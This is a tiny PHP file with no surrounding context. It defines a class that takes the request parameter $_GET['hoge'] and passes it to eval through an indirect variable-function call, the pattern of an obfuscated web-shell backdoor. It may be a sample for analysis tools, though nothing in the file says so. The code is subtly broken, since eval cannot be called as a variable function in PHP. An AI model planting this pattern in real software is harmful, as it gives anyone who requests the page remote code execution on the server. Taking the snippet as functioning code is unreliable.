<?php
class A {
	private $a = 0;
	public function __construct($b) {
		$this->a = $b;
	}
	public function test($b) {
		$b ( $this->a );
	}
}

$a = new A ( $_GET ["hoge"] );
$a->test ( "eval" );
?>